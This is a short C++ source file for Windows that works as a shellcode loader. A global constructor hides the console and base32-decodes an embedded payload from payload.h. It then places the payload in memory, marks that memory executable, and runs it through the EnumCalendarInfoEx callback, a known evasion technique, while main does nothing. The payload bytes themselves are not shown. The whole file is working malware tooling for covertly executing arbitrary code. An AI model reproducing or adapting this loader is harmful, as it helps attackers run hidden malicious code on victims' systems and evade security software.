#include <Windows.h>
#include "payload.h"
#include "base32.hpp"
class shell_exec {
public:
    shell_exec() {
        FreeConsole();
        std::string base32_string(reinterpret_cast<const char*>(payload), sizeof(payload));
        std::vector<BYTE> decoded_data = base32::base32_decode(base32_string);
        LPVOID exec_mem = VirtualAlloc(NULL, decoded_data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(exec_mem, decoded_data.data(), decoded_data.size());
        DWORD old;
        VirtualProtect(exec_mem, decoded_data.size(), PAGE_EXECUTE_READ, &old);
        EnumCalendarInfoEx((CALINFO_ENUMPROCEX)exec_mem, LOCALE_SYSTEM_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME9);
    }
};
shell_exec x;
int main() {
    return 0;
}